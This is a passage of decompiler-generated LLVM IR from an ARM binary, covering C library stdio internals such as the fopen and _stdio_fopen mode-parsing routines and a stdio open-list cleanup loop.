  br i1 %v9_f130, label %dec_label_pc_f138, label %dec_label_pc_f130.dec_label_pc_f100_crit_edge

dec_label_pc_f130.dec_label_pc_f100_crit_edge:    ; preds = %dec_label_pc_f130
  %v0_f100.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f100

dec_label_pc_f138:                                ; preds = %dec_label_pc_f130
  %v2_f138 = icmp ne i32 %v1_f130, 0
  store i1 %v2_f138, i1* %cpsr_c.global-to-local, align 1
  %v7_f13c = icmp slt i32 %v1_f130, 2
  br i1 %v7_f13c, label %dec_label_pc_f158, label %dec_label_pc_f140

dec_label_pc_f140:                                ; preds = %dec_label_pc_f138
  %v0_f140 = load i32, i32* @r7, align 4
  store i32 %v0_f140, i32* %r0.global-to-local, align 4
  %v0_f144 = load i32, i32* %r1.global-to-local, align 4
  %v1_f144 = add i32 %v0_f144, 129
  store i32 %v1_f144, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f0d0, %dec_label_pc_f140, %dec_label_pc_f138
  %v0_f158 = load i32, i32* @r5, align 4
  %v1_f158 = inttoptr i32 %v0_f158 to i16*
  %v2_f158 = load i16, i16* %v1_f158, align 2
  %v3_f158 = zext i16 %v2_f158 to i32
  %v1_f15c = and i32 %v3_f158, 24576
  %v1_f160 = or i32 %v1_f15c, 48
  store i32 %v1_f160, i32* %r3.global-to-local, align 4
  %v0_f164 = load i32, i32* @sb, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f164 = icmp eq i32 %v0_f164, 0
  %v1_f168 = trunc i32 %v1_f160 to i16
  store i16 %v1_f168, i16* %v1_f158, align 2
  br i1 %v2_f164, label %dec_label_pc_f170, label %dec_label_pc_f1e4

dec_label_pc_f170:                                ; preds = %dec_label_pc_f158
  %v0_f170 = load i32, i32* @r5, align 4
  %v1_f170 = add i32 %v0_f170, 60
  %v2_f170 = inttoptr i32 %v1_f170 to i32*
  %v3_f170 = load i32, i32* %v2_f170, align 4
  %v1_f174 = add i32 %v3_f170, -1
  store i32 %v1_f174, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f178 = icmp eq i32 %v1_f174, 0
  store i32 %v1_f174, i32* %v2_f170, align 4
  br i1 %v2_f178, label %dec_label_pc_f184, label %dec_label_pc_f1e4

dec_label_pc_f184:                                ; preds = %dec_label_pc_f170
  %v0_f184 = load i32, i32* %r3.global-to-local, align 4
  %v1_f184 = load i32, i32* @r5, align 4
  %v2_f184 = add i32 %v1_f184, 64
  %v3_f184 = inttoptr i32 %v2_f184 to i32*
  store i32 %v0_f184, i32* %v3_f184, align 4
  %v0_f188 = load i32, i32* @r5, align 4
  %v1_f188 = add i32 %v0_f188, 56
  store i32 %v1_f188, i32* @r6, align 4
  br label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f1bc.dec_label_pc_f18c_crit_edge, %dec_label_pc_f184
  %v0_f194 = phi i32 [ %v0_f194.pre, %dec_label_pc_f1bc.dec_label_pc_f18c_crit_edge ], [ %v1_f188, %dec_label_pc_f184 ]
  %v0_f18c = phi i32 [ %v0_f18c.pre, %dec_label_pc_f1bc.dec_label_pc_f18c_crit_edge ], [ %v0_f188, %dec_label_pc_f184 ]
  %v1_f18c = add i32 %v0_f18c, 56
  %v2_f18c = inttoptr i32 %v1_f18c to i32*
  %v3_f18c = load i32, i32* %v2_f18c, align 4
  store i32 %v3_f18c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_f194, i32* %r2.global-to-local, align 4
  %v1_f19882 = inttoptr i32 %v0_f194 to i32*
  %v2_f19883 = load i32, i32* %v1_f19882, align 4
  store i32 %v2_f19883, i32* %r3.global-to-local, align 4
  %v3_f19c85 = icmp uge i32 %v2_f19883, %v3_f18c
  store i1 %v3_f19c85, i1* %cpsr_c.global-to-local, align 1
  %v9_f19c91 = icmp eq i32 %v2_f19883, %v3_f18c
  br i1 %v9_f19c91, label %dec_label_pc_f1a4, label %dec_label_pc_f1bc

dec_label_pc_f1a4:                                ; preds = %dec_label_pc_f18c, %dec_label_pc_f1a4.dec_label_pc_f198_crit_edge
  %v0_f1a492 = phi i32 [ %v1_f19c.pre, %dec_label_pc_f1a4.dec_label_pc_f198_crit_edge ], [ %v3_f18c, %dec_label_pc_f18c ]
  store i32 %v0_f1a492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f1b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f1b4, label %dec_label_pc_f1b8, label %dec_label_pc_f1a4.dec_label_pc_f198_crit_edge

dec_label_pc_f1a4.dec_label_pc_f198_crit_edge:    ; preds = %dec_label_pc_f1a4
  %v0_f198.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f19c.pre = load i32, i32* @r4, align 4
  %v1_f198 = inttoptr i32 %v0_f198.pre to i32*
  %v2_f198 = load i32, i32* %v1_f198, align 4
  store i32 %v2_f198, i32* %r3.global-to-local, align 4
  %v3_f19c = icmp uge i32 %v2_f198, %v1_f19c.pre
  store i1 %v3_f19c, i1* %cpsr_c.global-to-local, align 1
  %v9_f19c = icmp eq i32 %v2_f198, %v1_f19c.pre
  br i1 %v9_f19c, label %dec_label_pc_f1a4, label %dec_label_pc_f1bc

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f1a4
  %v0_f1b8 = load i32, i32* @r4, align 4
  store i32 %v0_f1b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f1bc

dec_label_pc_f1bc:                                ; preds = %dec_label_pc_f18c, %dec_label_pc_f1a4.dec_label_pc_f198_crit_edge, %dec_label_pc_f1b8
  %v0_f1c4 = phi i32 [ %v0_f1b8, %dec_label_pc_f1b8 ], [ %v2_f19883, %dec_label_pc_f18c ], [ %v2_f198, %dec_label_pc_f1a4.dec_label_pc_f198_crit_edge ]
  %v1_f1bc = phi i32 [ %v0_f1b8, %dec_label_pc_f1b8 ], [ %v3_f18c, %dec_label_pc_f18c ], [ %v1_f19c.pre, %dec_label_pc_f1a4.dec_label_pc_f198_crit_edge ]
  %v3_f1bc = icmp uge i32 %v0_f1c4, %v1_f1bc
  store i1 %v3_f1bc, i1* %cpsr_c.global-to-local, align 1
  %v9_f1bc = icmp eq i32 %v0_f1c4, %v1_f1bc
  br i1 %v9_f1bc, label %dec_label_pc_f1c4, label %dec_label_pc_f1bc.dec_label_pc_f18c_crit_edge

dec_label_pc_f1bc.dec_label_pc_f18c_crit_edge:    ; preds = %dec_label_pc_f1bc
  %v0_f18c.pre = load i32, i32* @r5, align 4
  %v0_f194.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f18c

dec_label_pc_f1c4:                                ; preds = %dec_label_pc_f1bc
  %v2_f1c4 = icmp ne i32 %v1_f1bc, 0
  store i1 %v2_f1c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1c8 = icmp slt i32 %v1_f1bc, 2
  br i1 %v7_f1c8, label %dec_label_pc_f1e4, label %dec_label_pc_f1cc

dec_label_pc_f1cc:                                ; preds = %dec_label_pc_f1c4
  %v0_f1cc = load i32, i32* @r5, align 4
  %v1_f1cc = add i32 %v0_f1cc, 56
  store i32 %v1_f1cc, i32* %r0.global-to-local, align 4
  %v0_f1d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f1d0 = add i32 %v0_f1d0, 129
  store i32 %v1_f1d0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f170, %dec_label_pc_f158, %dec_label_pc_f1cc, %dec_label_pc_f1c4
  %v0_f1e4 = load i32, i32* @r5, align 4
  %v1_f1e4 = inttoptr i32 %v0_f1e4 to i16*
  %v2_f1e4 = load i16, i16* %v1_f1e4, align 2
  %v3_f1e4 = zext i16 %v2_f1e4 to i32
  store i32 %v3_f1e4, i32* %r3.global-to-local, align 4
  %v1_f1e8 = and i32 %v3_f1e4, 16384
  %v2_f1e8 = icmp eq i32 %v1_f1e8, 0
  br i1 %v2_f1e8, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_f1e4
  %v2_f1ec = add i32 %v0_f1e4, 8
  %v3_f1ec = inttoptr i32 %v2_f1ec to i32*
  %v4_f1ec = load i32, i32* %v3_f1ec, align 4
  store i32 %v4_f1ec, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_f1e4, %bb48
  %v1_f1f0 = xor i1 %v2_f1e8, true
  call void @__pseudo_cond_branch(i1 %v1_f1f0, i32 ptrtoint (i32* @global_var_c038.332 to i32))
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_f1f8 = load i32, i32* @r8, align 4
  %v2_f1f8 = add i32 %v0_f1f8, 168
  %v3_f1f8 = inttoptr i32 %v2_f1f8 to i32*
  %v4_f1f8 = load i32, i32* %v3_f1f8, align 4
  store i32 %v4_f1f8, i32* @r5, align 4
  %v1_f1fc = add i32 %v4_f1f8, 8
  %v2_f1fc = inttoptr i32 %v1_f1fc to i32*
  %v3_f1fc = load i32, i32* %v2_f1fc, align 4
  store i32 %v3_f1fc, i32* %r3.global-to-local, align 4
  %v1_f200 = load i32, i32* %sl.global-to-local, align 4
  %v3_f200 = icmp uge i32 %v3_f1fc, %v1_f200
  store i1 %v3_f200, i1* %cpsr_c.global-to-local, align 1
  %v9_f200 = icmp eq i32 %v3_f1fc, %v1_f200
  br i1 %v9_f200, label %dec_label_pc_f248, label %dec_label_pc_f208

dec_label_pc_f208:                                ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_f1f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_f21475 = inttoptr i32 %v4_f1f8 to i32*
  %v2_f21476 = load i32, i32* %v1_f21475, align 4
  store i32 %v2_f21476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_f21878 = icmp eq i32 %v2_f21476, 0
  br i1 %v9_f21878, label %dec_label_pc_f220, label %dec_label_pc_f238

dec_label_pc_f220:                                ; preds = %dec_label_pc_f208, %dec_label_pc_f220.dec_label_pc_f214_crit_edge
  %v0_f22079 = phi i32 [ %v1_f218.pre, %dec_label_pc_f220.dec_label_pc_f214_crit_edge ], [ 0, %dec_label_pc_f208 ]
  store i32 %v0_f22079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f230 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f230, label %dec_label_pc_f234, label %dec_label_pc_f220.dec_label_pc_f214_crit_edge

dec_label_pc_f220.dec_label_pc_f214_crit_edge:    ; preds = %dec_label_pc_f220
  %v0_f214.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f218.pre = load i32, i32* @r4, align 4
  %v1_f214 = inttoptr i32 %v0_f214.pre to i32*
  %v2_f214 = load i32, i32* %v1_f214, align 4
  store i32 %v2_f214, i32* %r3.global-to-local, align 4
  %v3_f218 = icmp uge i32 %v2_f214, %v1_f218.pre
  store i1 %v3_f218, i1* %cpsr_c.global-to-local, align 1
  %v9_f218 = icmp eq i32 %v2_f214, %v1_f218.pre
  br i1 %v9_f218, label %dec_label_pc_f220, label %dec_label_pc_f238

dec_label_pc_f234:                                ; preds = %dec_label_pc_f220
  %v0_f234 = load i32, i32* @r4, align 4
  store i32 %v0_f234, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f238

dec_label_pc_f238:                                ; preds = %dec_label_pc_f208, %dec_label_pc_f220.dec_label_pc_f214_crit_edge, %dec_label_pc_f234
  %v0_f238 = phi i32 [ %v0_f234, %dec_label_pc_f234 ], [ %v2_f21476, %dec_label_pc_f208 ], [ %v2_f214, %dec_label_pc_f220.dec_label_pc_f214_crit_edge ]
  %v1_f238 = phi i32 [ %v0_f234, %dec_label_pc_f234 ], [ 0, %dec_label_pc_f208 ], [ %v1_f218.pre, %dec_label_pc_f220.dec_label_pc_f214_crit_edge ]
  %v3_f238 = icmp uge i32 %v0_f238, %v1_f238
  store i1 %v3_f238, i1* %cpsr_c.global-to-local, align 1
  %v9_f238 = icmp eq i32 %v0_f238, %v1_f238
  br i1 %v9_f238, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_f238
  %v1_f23c = load i32, i32* @r5, align 4
  store i32 %v1_f23c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_f238, %bb50
  %v1_f240 = xor i1 %v9_f238, true
  call void @__pseudo_cond_branch(i1 %v1_f240, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_f244 = load i32, i32* %sl.global-to-local, align 4
  %v1_f244 = load i32, i32* @r5, align 4
  %v2_f244 = add i32 %v1_f244, 8
  %v3_f244 = inttoptr i32 %v2_f244 to i32*
  store i32 %v0_f244, i32* %v3_f244, align 4
  %v0_f24c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f248

dec_label_pc_f248:                                ; preds = %bb49, %bb51
  %v0_f24c = phi i32 [ %v0_f1f8, %bb49 ], [ %v0_f24c.pre, %bb51 ]
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_f24c = add i32 %v0_f24c, 88
  %v3_f24c = inttoptr i32 %v2_f24c to i32*
  %v4_f24c = load i32, i32* %v3_f24c, align 4
  store i32 %v4_f24c, i32* %r2.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_f254 = add i32 %v0_f24c, 168
  %v3_f254 = inttoptr i32 %v2_f254 to i32*
  %v4_f254 = load i32, i32* %v3_f254, align 4
  store i32 %v4_f254, i32* %r0.global-to-local, align 4
  %v1_f258 = inttoptr i32 %v4_f24c to i32*
  %v2_f258 = load i32, i32* %v1_f258, align 4
  store i32 %v2_f258, i32* %r3.global-to-local, align 4
  %v1_f25c = add i32 %v4_f254, 4
  %v2_f25c = inttoptr i32 %v1_f25c to i32*
  %v3_f25c = load i32, i32* %v2_f25c, align 4
  store i32 %v3_f25c, i32* %r1.global-to-local, align 4
  %v1_f260 = add i32 %v2_f258, 1
  store i32 %v1_f260, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f264 = icmp eq i32 %v3_f25c, 0
  store i32 %v1_f260, i32* %v1_f258, align 4
  br i1 %v2_f264, label %dec_label_pc_f270, label %dec_label_pc_f2d0

dec_label_pc_f270:                                ; preds = %dec_label_pc_f248
  %v0_f270 = load i32, i32* %r1.global-to-local, align 4
  %v1_f270 = load i32, i32* %r0.global-to-local, align 4
  %v2_f270 = add i32 %v1_f270, 8
  %v3_f270 = inttoptr i32 %v2_f270 to i32*
  store i32 %v0_f270, i32* %v3_f270, align 4
  %v0_f274 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f274, i32* @r5, align 4
  br label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f2a8.dec_label_pc_f278_crit_edge, %dec_label_pc_f270
  %v0_f278 = phi i32 [ %v0_f278.pre, %dec_label_pc_f2a8.dec_label_pc_f278_crit_edge ], [ %v0_f274, %dec_label_pc_f270 ]
  %v1_f278 = inttoptr i32 %v0_f278 to i32*
  %v2_f278 = load i32, i32* %v1_f278, align 4
  store i32 %v2_f278, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_f278, i32* %r2.global-to-local, align 4
  %v2_f28464 = load i32, i32* %v1_f278, align 4
  store i32 %v2_f28464, i32* %r3.global-to-local, align 4
  %v3_f28866 = icmp uge i32 %v2_f28464, %v2_f278
  store i1 %v3_f28866, i1* %cpsr_c.global-to-local, align 1
  %v9_f28872 = icmp eq i32 %v2_f28464, %v2_f278
  br i1 %v9_f28872, label %dec_label_pc_f290, label %dec_label_pc_f2a8

dec_label_pc_f290:                                ; preds = %dec_label_pc_f278, %dec_label_pc_f290.dec_label_pc_f284_crit_edge
  %v0_f29073 = phi i32 [ %v1_f288.pre, %dec_label_pc_f290.dec_label_pc_f284_crit_edge ], [ %v2_f278, %dec_label_pc_f278 ]
  store i32 %v0_f29073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f2a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f2a0, label %dec_label_pc_f2a4, label %dec_label_pc_f290.dec_label_pc_f284_crit_edge

dec_label_pc_f290.dec_label_pc_f284_crit_edge:    ; preds = %dec_label_pc_f290
  %v0_f284.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f288.pre = load i32, i32* @r4, align 4
  %v1_f284 = inttoptr i32 %v0_f284.pre to i32*
  %v2_f284 = load i32, i32* %v1_f284, align 4
  store i32 %v2_f284, i32* %r3.global-to-local, align 4
  %v3_f288 = icmp uge i32 %v2_f284, %v1_f288.pre
  store i1 %v3_f288, i1* %cpsr_c.global-to-local, align 1
  %v9_f288 = icmp eq i32 %v2_f284, %v1_f288.pre
  br i1 %v9_f288, label %dec_label_pc_f290, label %dec_label_pc_f2a8

dec_label_pc_f2a4:                                ; preds = %dec_label_pc_f290
  %v0_f2a4 = load i32, i32* @r4, align 4
  store i32 %v0_f2a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f2a8

dec_label_pc_f2a8:                                ; preds = %dec_label_pc_f278, %dec_label_pc_f290.dec_label_pc_f284_crit_edge, %dec_label_pc_f2a4
  %v0_f2b0 = phi i32 [ %v0_f2a4, %dec_label_pc_f2a4 ], [ %v2_f28464, %dec_label_pc_f278 ], [ %v2_f284, %dec_label_pc_f290.dec_label_pc_f284_crit_edge ]
  %v1_f2a8 = phi i32 [ %v0_f2a4, %dec_label_pc_f2a4 ], [ %v2_f278, %dec_label_pc_f278 ], [ %v1_f288.pre, %dec_label_pc_f290.dec_label_pc_f284_crit_edge ]
  %v3_f2a8 = icmp uge i32 %v0_f2b0, %v1_f2a8
  store i1 %v3_f2a8, i1* %cpsr_c.global-to-local, align 1
  %v9_f2a8 = icmp eq i32 %v0_f2b0, %v1_f2a8
  br i1 %v9_f2a8, label %dec_label_pc_f2b0, label %dec_label_pc_f2a8.dec_label_pc_f278_crit_edge

dec_label_pc_f2a8.dec_label_pc_f278_crit_edge:    ; preds = %dec_label_pc_f2a8
  %v0_f278.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f278

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2a8
  %v2_f2b0 = icmp ne i32 %v1_f2a8, 0
  store i1 %v2_f2b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f2b4 = icmp slt i32 %v1_f2a8, 2
  br i1 %v7_f2b4, label %dec_label_pc_f2d0, label %dec_label_pc_f2b8

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f2b0
  %v0_f2b8 = load i32, i32* @r5, align 4
  store i32 %v0_f2b8, i32* %r0.global-to-local, align 4
  %v0_f2bc = load i32, i32* %r1.global-to-local, align 4
  %v1_f2bc = add i32 %v0_f2bc, 129
  store i32 %v1_f2bc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f248, %dec_label_pc_f2b8, %dec_label_pc_f2b0
  %v0_f2d0 = call i32 @_stdio_openlist_dec_use()
  %v0_f2d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_f2d4, i32* %r0.global-to-local, align 4
  %v2_f2dc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f2dc, i32* @r4, align 4
  store i32 %v6_efc4, i32* @r5, align 4
  store i32 %v9_efc4, i32* @r6, align 4
  store i32 %v12_efc4, i32* @r7, align 4
  store i32 %v15_efc4, i32* @r8, align 4
  store i32 %v18_efc4, i32* @sb, align 4
  store i32 %v27_efc4, i32* @lr, align 4
  ret i32 %v0_f2d4

; uselistorder directives
  uselistorder i32 %v0_f2a4, { 1, 0, 2 }
  uselistorder i32 %v1_f288.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f278, { 1, 0 }
  uselistorder i32 %v0_f24c, { 1, 0 }
  uselistorder i32 %v0_f234, { 1, 0, 2 }
  uselistorder i32 %v1_f218.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_f200, { 1, 0 }
  uselistorder i32 %v0_f1b8, { 1, 0, 2 }
  uselistorder i32 %v1_f19c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f12c, { 1, 0, 2 }
  uselistorder i32 %v1_f110.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f100, { 1, 0 }
  uselistorder i32 %v0_f0bc, { 1, 0, 2 }
  uselistorder i32 %v1_f0a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f080, { 1, 0 }
  uselistorder i32 %v1_f00c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 10, 11, 13, 12, 1, 14, 17, 15, 16, 18, 20, 19, 46, 21, 22, 23, 24, 25, 27, 26, 45, 28, 29, 30, 31, 33, 32, 2, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 30, 31, 10, 11, 12, 13, 32, 33, 14, 15, 16, 17, 18, 34, 35, 19, 20, 22, 21, 1, 23, 24, 25, 27, 26, 2, 28, 29 }
  uselistorder label %dec_label_pc_f2d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f2a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f290, { 1, 0 }
  uselistorder label %dec_label_pc_f248, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_f238, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f220, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_f1e4, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_f1bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f1a4, { 1, 0 }
  uselistorder label %dec_label_pc_f158, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f130, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f118, { 1, 0 }
  uselistorder label %dec_label_pc_f0d0, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_f0c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f0a8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_f048, { 1, 0 }
  uselistorder label %dec_label_pc_f03c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_f02c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f014, { 1, 0 }
}

define i32 @function_f2e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2e8:
  %v0_f2e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f2e8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_f2e8
  %v2_f2e8 = load i32, i32* @r8, align 4
  %v5_f2e8 = udiv i32 %v2_f2e8, 2
  %v6_f2e8 = and i32 %v5_f2e8, %arg1
  %v2_f2ec = load i32, i32* @ip, align 4
  %v3_f2ec = and i32 %v6_f2e8, %v2_f2ec
  %v8_f2f0 = ashr i32 %v2_f2e8, %v3_f2ec
  %v9_f2f0 = and i32 %v8_f2f0, %v3_f2ec
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_f2e8, %bb
  %v10_f2f0 = phi i32 [ %arg1, %dec_label_pc_f2e8 ], [ %v9_f2f0, %bb ]
  ret i32 %v10_f2f0

; uselistorder directives
  uselistorder i32 %v2_f2e8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_f304 = call i32 @_stdio_fopen()
  ret i32 %v0_f304
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_f314 = load i32, i32* @r4, align 4
  store i32 %v3_f314, i32* %stack_var_-24, align 4
  %v6_f314 = load i32, i32* @r5, align 4
  %v9_f314 = load i32, i32* @r6, align 4
  %v12_f314 = load i32, i32* @r7, align 4
  %v15_f314 = load i32, i32* @r8, align 4
  %v0_f318 = load i32, i32* @r1, align 4
  %v1_f318 = inttoptr i32 %v0_f318 to i8*
  %v2_f318 = load i8, i8* %v1_f318, align 1
  %v3_f318 = zext i8 %v2_f318 to i32
  store i32 %v3_f318, i32* @ip, align 4
  %v2_f320 = icmp ugt i8 %v2_f318, 113
  store i1 %v2_f320, i1* %cpsr_c.global-to-local, align 1
  %v7_f320 = icmp eq i8 %v2_f318, 114
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r8, align 4
  %v0_f32c = load i32, i32* @r0, align 4
  store i32 %v0_f32c, i32* @r7, align 4
  %v0_f330 = load i32, i32* @r2, align 4
  store i32 %v0_f330, i32* @r5, align 4
  %v0_f334 = load i32, i32* @r3, align 4
  store i32 %v0_f334, i32* @r6, align 4
  br i1 %v7_f320, label %dec_label_pc_f388, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %entry
  %v2_f33c = icmp ugt i8 %v2_f318, 118
  store i1 %v2_f33c, i1* %cpsr_c.global-to-local, align 1
  %v7_f33c = icmp eq i8 %v2_f318, 119
  br i1 %v7_f33c, label %bb, label %dec_label_pc_f348

bb:                                               ; preds = %dec_label_pc_f33c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_f38c

dec_label_pc_f348:                                ; preds = %dec_label_pc_f33c
  %v2_f348 = icmp ugt i8 %v2_f318, 96
  store i1 %v2_f348, i1* %cpsr_c.global-to-local, align 1
  %v7_f348 = icmp eq i8 %v2_f318, 97
  br i1 %v7_f348, label %bb49, label %dec_label_pc_f354

bb49:                                             ; preds = %dec_label_pc_f348
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_f38c

dec_label_pc_f354:                                ; preds = %dec_label_pc_f348, %dec_label_pc_f424, %dec_label_pc_f3f8
  store i32 77708, i32* %r2.global-to-local, align 4
  %v0_f358 = call i32 @__aeabi_read_tp()
  store i32 %v0_f358, i32* %r0.global-to-local, align 4
  %v3_f35c = load i16, i16* @global_var_222f0.75, align 2
  %v4_f35c = sext i16 %v3_f35c to i32
  store i32 %v4_f35c, i32* @r2, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_f364 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f364 = icmp eq i32 %v0_f364, 0
  %v3_f368 = add i32 %v4_f35c, %v0_f358
  %v4_f368 = inttoptr i32 %v3_f368 to i32*
  store i32 22, i32* %v4_f368, align 4
  br i1 %v2_f364, label %dec_label_pc_f72c, label %dec_label_pc_f370

dec_label_pc_f370:                                ; preds = %dec_label_pc_f448._crit_edge, %dec_label_pc_f354
  %v0_f370 = load i32, i32* @r5, align 4
  %v1_f370 = inttoptr i32 %v0_f370 to i16*
  %v2_f370 = load i16, i16* %v1_f370, align 2
  %v3_f370 = zext i16 %v2_f370 to i32
  store i32 %v3_f370, i32* %r3.global-to-local, align 4
  %v1_f374 = and i32 %v3_f370, 8192
  %v2_f374 = icmp eq i32 %v1_f374, 0
  br i1 %v2_f374, label %dec_label_pc_f72c, label %dec_label_pc_f37c

dec_label_pc_f37c:                                ; preds = %dec_label_pc_f370
  store i32 %v0_f370, i32* @r0, align 4
  %v0_f380 = call i32 @free()
  store i32 %v0_f380, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f72c

dec_label_pc_f388:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_f38c

dec_label_pc_f38c:                                ; preds = %bb, %bb49, %dec_label_pc_f388
  %v1_f3a4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_f388 ]
  %v1_f38c = add i32 %v0_f318, 1
  %v2_f38c = inttoptr i32 %v1_f38c to i8*
  %v3_f38c = load i8, i8* %v2_f38c, align 1
  %v2_f390 = icmp ugt i8 %v3_f38c, 97
  store i1 %v2_f390, i1* %cpsr_c.global-to-local, align 1
  %v7_f390 = icmp eq i8 %v3_f38c, 98
  %v1_f38c.v0_f318 = select i1 %v7_f390, i32 %v1_f38c, i32 %v0_f318
  store i32 %v1_f38c.v0_f318, i32* %r3.global-to-local, align 4
  %v1_f39c = add i32 %v1_f38c.v0_f318, 1
